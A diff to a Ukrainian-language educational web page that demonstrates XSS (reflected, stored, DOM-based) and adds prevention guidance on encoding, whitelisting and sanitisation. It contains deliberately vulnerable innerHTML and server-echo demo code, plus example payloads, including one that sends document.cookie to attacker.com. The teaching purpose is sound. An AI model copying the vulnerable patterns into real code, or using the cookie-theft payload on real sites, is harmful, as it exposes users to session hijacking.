@@ -94,6 +94,7 @@
         <ul>
             <li><a href="#introduction">Вступ</a></li>
             <li><a href="#xss-demo">XSS</a></li>
+            <li><a href="#xss-prevention">XSS prevention</a></li>
             <li><a href="#csrf-demo">CSRF</a></li>
             <li><a href="#conclusion">Висновки</a></li>
         </ul>
@@ -133,76 +134,118 @@
             повністю скомпрометувати взаємодію користувача з додатком.
 
             <h2>Демонстрація XSS атак</h2>
+            <!-- ----------------------------------------------------- -->
             <div class="demo-section">
                 <h3>1. Reflected XSS</h3>
-                Reflected XSS (відображений XSS) — це тип міжсайтового скриптингу, при якому шкідливий код передається через URL або інші вхідні дані та негайно відображається на сторінці без збереження на сервері.
+                Reflected XSS (відображений XSS) — це тип міжсайтового скриптингу, при якому шкідливий код передається
+                через URL або інші вхідні дані та негайно відображається на сторінці без збереження на сервері.
                 <p>Введіть текст нижче та натисніть "Відобразити вразливо" для демонстрації вразливого відображення:</p>
                 <!-- <img src="invalid.jpg" onerror="alert('XSS')"> -->
 
                 <input type="text" id="xssInput" style="width: 600px;"
-       placeholder="Введіть текст, наприклад: &lt;img src=&quot;invalid.jpg&quot; onerror=&quot;alert('XSS')&quot;&gt;">
+                    placeholder="Введіть текст, наприклад: &lt;img src=&quot;invalid.jpg&quot; onerror=&quot;alert('XSS')&quot;&gt;">
 
                 <br>
                 <button onclick="xssVulnerable()">Відобразити вразливо (innerHTML)</button>
                 <button onclick="xssSafe()">Відобразити безпечно (textContent)</button>
                 <div id="xssOutput" style="margin-top:20px; padding:10px; border:1px solid #ccc;"></div>
-            </div>
-            <h3>Детальний опис вразливості XSS</h3>
-            <p><strong>Як виникає ця вразливість?</strong><br>
-                Вразливість виникає через неправильну обробку та відображення введених користувачем даних на
-                веб-сторінці. Зокрема, уразливість з’являється тоді, коли дані, отримані від користувача, без належного
-                екранування (escaping) або перевірки безпосередньо відображаються на сторінці за допомогою методу
-                <code>innerHTML</code>.
-            </p>
 
-            <h4>Приклад вразливого коду:</h4>
-            <pre>function xssVulnerable() {
+                <h3>Детальний опис вразливості XSS</h3>
+                <p><strong>Як виникає ця вразливість?</strong><br>
+                    Вразливість виникає через неправильну обробку та відображення введених користувачем даних на
+                    веб-сторінці. Зокрема, уразливість з’являється тоді, коли дані, отримані від користувача, без
+                    належного
+                    екранування (escaping) або перевірки безпосередньо відображаються на сторінці за допомогою методу
+                    <code>innerHTML</code>.
+                </p>
+
+                <h4>Приклад вразливого коду:</h4>
+                <pre>function xssVulnerable() {
     var userInput = document.getElementById("xssInput").value;
     document.getElementById("xssOutput").innerHTML = "Результат: " + userInput;}</pre>
 
-            <h4>Чому виникає вразливість?</h4>
-            <ul>
-                <li>Відсутність екранування (escaping) введених даних.</li>
-                <li>Надмірна довіра до введених даних.</li>
-                <li>Недостатнє використання безпечних методів відображення.</li>
-            </ul>
+                <h4>Чому виникає вразливість?</h4>
+                <ul>
+                    <li>Відсутність екранування (escaping) введених даних.</li>
+                    <li>Надмірна довіра до введених даних.</li>
+                    <li>Недостатнє використання безпечних методів відображення.</li>
+                </ul>
 
-            <h4>Наслідки вразливості</h4>
-            <ul>
-                <li>Викрадення сесійних даних або кукі користувача:</li>
-                <pre>&lt;script&gt;fetch('http://attacker.com/steal?cookie=' + document.cookie);&lt;/script&gt;</pre>
-                <li>Перенаправлення користувача на шкідливий сайт:</li>
-                <pre>&lt;script&gt;window.location.href='http://phishing.com';&lt;/script&gt;</pre>
-                <li>Виконання будь-яких дій від імені користувача:</li>
-                <pre>&lt;button onclick="fetch('http://malicious.com/transfer?amount=1000')"&gt;Click me&lt;/button&gt;</pre>
-                <li>Підробка інтерфейсу або вмісту сторінки:</li>
-                <pre>&lt;script&gt;document.body.innerHTML = '&lt;h1&gt;Злом успішний!&lt;/h1&gt;';&lt;/script&gt;</pre>
-            </ul>
+                <h4>Наслідки вразливості</h4>
+                <ul>
+                    <li>Викрадення сесійних даних або кукі користувача:</li>
+                    <pre>&lt;script&gt;fetch('http://attacker.com/steal?cookie=' + document.cookie);&lt;/script&gt;</pre>
+                    <li>Перенаправлення користувача на шкідливий сайт:</li>
+                    <pre>&lt;script&gt;window.location.href='http://phishing.com';&lt;/script&gt;</pre>
+                    <li>Виконання будь-яких дій від імені користувача:</li>
+                    <pre>&lt;button onclick="fetch('http://malicious.com/transfer?amount=1000')"&gt;Click me&lt;/button&gt;</pre>
+                    <li>Підробка інтерфейсу або вмісту сторінки:</li>
+                    <pre>&lt;script&gt;document.body.innerHTML = '&lt;h1&gt;Злом успішний!&lt;/h1&gt;';&lt;/script&gt;</pre>
+                </ul>
 
-            <h4>Як ми подолали вразливість?</h4>
-            <p>Ми використовуємо метод <code>textContent</code> замість <code>innerHTML</code>, що дозволяє безпечно
-                виводити текст без виконання скриптів.</p>
+                <h4>Як ми подолали вразливість?</h4>
+                <p>Ми використовуємо метод <code>textContent</code> замість <code>innerHTML</code>, що дозволяє безпечно
+                    виводити текст без виконання скриптів.</p>
 
-            <h4>Безпечний код:</h4>
-            <pre>function xssSafe() {
+                <h4>Безпечний код:</h4>
+                <pre>function xssSafe() {
     var userInput = document.getElementById("xssInput").value;
     document.getElementById("xssOutput").textContent = "Результат: " + userInput;
 }</pre>
 
-            <p>Метод <code>textContent</code> відображає текст без обробки як HTML-код, що гарантує захист від виконання
-                скриптів.</p>
+                <p>Метод <code>textContent</code> відображає текст без обробки як HTML-код, що гарантує захист від
+                    виконання
+                    скриптів.</p>
 
-                <div class="demo-section">
-                    <h3>2. Stored XSS</h3>
-                    <!-- <button onclick="alert('Hacked!')">Click Me</button> -->
+            </div>
 
-                    <p>Збережений XSS (Stored XSS) — це вразливість безпеки, при якій шкідливий код зберігається на сервері та відображається кожному користувачеві при перегляді вмісту.</p>
-                    <label for="commentInput">Введіть коментар:</label>
-                    <input type="text" id="commentInput" placeholder="Введіть коментар..."><br>
-                    <button onclick="submitComment()">Зберегти коментар</button>
-                    <h4>Відображення коментарів:</h4>
-                    <div id="commentSection"></div>
-                </div>
+            <!-- ----------------------------------------------------- -->
+            <div class="demo-section">
+                <h3>2. Reflected XSS</h3>
+
+                <h3>Приклад атаки:</h3>
+                <p>
+                    Наприклад, URL може виглядати так:
+                <pre>http://localhost:3000/reflected?input=&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
+                Якщо користувач перейде за цим посиланням, браузер виконає шкідливий скрипт.
+                </p>
+                <h4>Чому виникає вразливість?</h4>
+                <ul>
+                    <li>Неправильне екранування введених користувачем даних.</li>
+                    <li>Пряме включення даних з URL в HTML-відповідь без обробки.</li>
+                </ul>
+
+                <h4>Функція на сервері:</h4>
+                <p>У серверному коді для демонстрації Reflected XSS використовується наступна функція:</p>
+                <pre style="background-color: #f0f0f0; padding: 10px; border-radius: 5px; white-space: pre-wrap;">
+app.get('/reflected', (req, res) => {
+    const userInput = req.query.input;
+    res.send(`
+        &lt;h1&gt;Reflected XSS Example&lt;/h1&gt;
+        &lt;p&gt;${userInput}&lt;/p&gt;
+    `);
+});
+    </pre>
+                <p>
+                    Функція бере параметр <code>input</code> з URL і безпосередньо вставляє його у відповідь сервера. Це
+                    дозволяє шкідливому коду виконуватися у браузері користувача.
+                </p>
+            </div>
+
+
+            <!-- ----------------------------------------------------- -->
+            <div class="demo-section">
+                <h3>3. Stored XSS</h3>
+                <!-- <button onclick="alert('Hacked!')">Click Me</button> -->
+
+                <p>Збережений XSS (Stored XSS) — це вразливість безпеки, при якій шкідливий код зберігається на сервері
+                    та відображається кожному користувачеві при перегляді вмісту.</p>
+                <label for="commentInput">Введіть коментар:</label>
+                <input type="text" id="commentInput" placeholder="Введіть коментар..."><br>
+                <button onclick="submitComment()">Зберегти коментар</button>
+                <h4>Відображення коментарів:</h4>
+                <div id="commentSection"></div>
+
 
 
                 <h4>Як запобігти збереженому XSS?</h4>
@@ -221,7 +264,8 @@
                         Цей підхід забезпечує безпечне відображення без виконання скриптів.
                     </li>
                     <li>
-                        <strong>Використовувати безпечні методи відображення, такі як textContent або createTextNode.</strong><br>
+                        <strong>Використовувати безпечні методи відображення, такі як textContent або
+                            createTextNode.</strong><br>
                         Замість <code>innerHTML</code>, яке може виконувати скрипти, використовуйте:
                         <pre>document.getElementById("output").textContent = userInput;</pre>
                         або
@@ -229,14 +273,126 @@
                 document.getElementById("output").appendChild(textNode);</pre>
                     </li>
                     <li>
-                        <strong>Здійснювати валідацію та санітизацію введених користувачем даних на стороні сервера.</strong><br>
-                        Перед збереженням коментарів на сервері видаляйте небезпечні символи та HTML-теги. Наприклад, на сервері використовуйте бібліотеки для санітизації введення:
+                        <strong>Здійснювати валідацію та санітизацію введених користувачем даних на стороні
+                            сервера.</strong><br>
+                        Перед збереженням коментарів на сервері видаляйте небезпечні символи та HTML-теги. Наприклад, на
+                        сервері використовуйте бібліотеки для санітизації введення:
                         <pre>const sanitizedInput = sanitizeHtml(userInput);</pre>
                     </li>
                 </ul>
-                
+            </div>
+
+            <!-- ----------------------------------------------------- -->
+            <div class="demo-section">
+                <h3>4. DOM-based XSS</h3>
+
+                <p>
+                    DOM-based XSS (Міжсайтовий скриптинг на основі DOM) — це тип XSS-атаки, при якій шкідливий код
+                    виконується безпосередньо на стороні клієнта шляхом маніпулювання елементами DOM. У цьому випадку
+                    дані з URL або інших джерел використовуються для зміни структури сторінки без належної обробки або
+                    екранування.
+                </p>
+                <h3>Як працює DOM-Based XSS?</h3>
+                <p>
+                    Уразливість виникає через неправильну обробку користувацьких даних у JavaScript на стороні клієнта.
+                    Зловмисник може сформувати URL з шкідливими параметрами, які інтерпретуються браузером як частина
+                    сторінки.
+                </p>
+                <h3>Приклад атаки:</h3>
+                <p>
+                    Спробуйте ввести текст у поле введення та натиснути кнопку:
+                    <input type="text" id="domXssInput" placeholder="Введіть щось...">
+                    <button onclick="domXssDemo()">Показати</button>
+                </p>
+                <div id="domOutput"></div>
+                <script>
+                    function domXssDemo() {
+                        var userInput = document.getElementById("domXssInput").value;
+                        document.getElementById("domOutput").innerHTML = "<p>Результат: " + userInput + "</p>";
+                    }
+                </script>
+                <p>
+                    <strong>Приклад шкідливого вводу:</strong><br>
+                    Введіть наступний текст у поле вище та натисніть "Показати":<br>
+                <pre>&lt;img src=1 onerror='alert("DOM XSS")'&gt;</pre>
+                Шкідливий код виконається безпосередньо на стороні клієнта, якщо система вразлива до DOM-Based XSS.
+                </p>
+                <h4>Чому виникає вразливість?</h4>
+                <ul>
+                    <li>Неправильна обробка або екранування даних з форми введення.</li>
+                    <li>Безпосереднє використання користувацьких даних у DOM через innerHTML.</li>
+                </ul>
+                <h4>Як запобігти?</h4>
+                <ul>
+                    <li>Використовувати безпечні методи вставки даних, наприклад, <code>textContent</code> або
+                        <code>createTextNode</code>.</li>
+                    <li>Екранізувати дані перед виведенням у DOM.</li>
+                    <li>Уникати використання <code>innerHTML</code> для виведення даних з неперевірених джерел.</li>
+                </ul>
+                <h4>Безпечний код:</h4>
+                <pre style="background-color: #f0f0f0; padding: 10px; border-radius: 5px; white-space: pre-wrap;">
+function domXssDemo() {
+    var userInput = document.getElementById("domXssInput").value;
+    var safeText = document.createTextNode("Результат: " + userInput);
+    var outputDiv = document.getElementById("domOutput");
+    outputDiv.innerHTML = "";
+    outputDiv.appendChild(safeText);
+}
+    </pre>
+                <p>
+                    У цьому прикладі використовується <code>createTextNode</code> замість <code>innerHTML</code>, що
+                    гарантує безпечне відображення введених даних.
+                </p>
+            </div>
 
         </section>
+
+        <section id="xss-prevention">
+            <h2>Як запобігти XSS</h2>
+
+            <h3>Загальні принципи</h3>
+            <p>
+                Запобігання міжсайтовому скриптингу зазвичай досягається за допомогою двох рівнів захисту:
+            </p>
+            <ul>
+                <li>Кодування даних перед виведенням</li>
+                <li>Валідація даних на етапі отримання</li>
+            </ul>
+            <p>
+                Кодування слід застосовувати безпосередньо перед записом користувацьких даних на сторінку, оскільки контекст, в який ви записуєте, визначає тип необхідного кодування.
+            </p>
+            <h4>Кодування даних перед виведенням</h4>
+            <p>
+                Кодування повинно застосовуватись безпосередньо перед тим, як користувацькі дані записуються на сторінку. Контекст, у який ви записуєте, визначає необхідний тип кодування.
+            </p>
+            <h5>HTML-контекст</h5>
+            <pre>&lt; перетворюється на: &amp;lt;</pre>
+        <pre>&gt; перетворюється на: &amp;gt;</pre>
+            <h5>Контекст JavaScript</h5>
+            <pre>&lt; перетворюється на: \u003c</pre>
+        <pre>&gt; перетворюється на: \u003e</pre>
+            <h5>Приклад комбінованого кодування</h5>
+            <pre>&lt;a href="#" onclick="x='Цей рядок потребує двох рівнів екранування'"&gt;тест&lt;/a&gt;</pre>
+            <h4>Валідація даних на етапі отримання</h4>
+            <p>
+                Кодування є найважливішим елементом захисту від XSS, але воно не завжди достатнє. Важливо також проводити валідацію введених даних якомога суворіше при першому їх отриманні.
+            </p>
+            <h5>Приклади валідації даних</h5>
+            <ul>
+                <li>Перевірка, що URL починається з безпечного протоколу (наприклад, HTTP або HTTPS).</li>
+                <li>Перевірка, що введення містить лише очікуваний набір символів.</li>
+                <li>Перевірка, що числове введення дійсно містить число.</li>
+            </ul>
+            <h4>Білий список проти чорного списку</h4>
+            <p>
+                Валідація введення повинна зазвичай використовувати білі списки, а не чорні списки. Наприклад, замість перерахування шкідливих протоколів (javascript, data) слід створити список безпечних протоколів (HTTP, HTTPS) і блокувати все інше.
+            </p>
+            <h4>Дозволені "безпечні" HTML</h4>
+            <p>
+                Дозволяти користувачам розміщувати HTML-розмітку слід уникати за можливості, але іноді це необхідно (наприклад, у блогах або форумах). Використовуйте бібліотеки на кшталт DOMPurify для безпечної фільтрації HTML.
+            </p>
+        </section>        
+        
 
         <!-- CSRF Demonstration -->
         <section id="csrf-demo">
@@ -341,39 +497,39 @@
         var comments = [];
 
         async function submitComment() {
-        var comment = document.getElementById("commentInput").value;
-        try {
-            const response = await fetch('/comments', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ comment: comment })
-            });
-            const data = await response.json();
+            var comment = document.getElementById("commentInput").value;
+            try {
+                const response = await fetch('/comments', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ comment: comment })
+                });
+                const data = await response.json();
+                loadComments();
+            } catch (error) {
+                console.error('Error submitting comment:', error);
+            }
+        }
+
+        async function loadComments() {
+            try {
+                const response = await fetch('/comments');
+                const data = await response.json();
+                var commentHtml = "";
+                data.forEach(comment => {
+                    commentHtml += `<p>${comment}</p>`;
+                });
+                document.getElementById("commentSection").innerHTML = commentHtml;
+            } catch (error) {
+                console.error('Error loading comments:', error);
+            }
+        }
+
+        window.onload = function () {
             loadComments();
-        } catch (error) {
-            console.error('Error submitting comment:', error);
         }
-    }
-
-    async function loadComments() {
-        try {
-            const response = await fetch('/comments');
-            const data = await response.json();
-            var commentHtml = "";
-            data.forEach(comment => {
-                commentHtml += `<p>${comment}</p>`;
-            });
-            document.getElementById("commentSection").innerHTML = commentHtml;
-        } catch (error) {
-            console.error('Error loading comments:', error);
-        }
-    }
-
-    window.onload = function () {
-        loadComments();
-    }
     </script>
 </body>
 
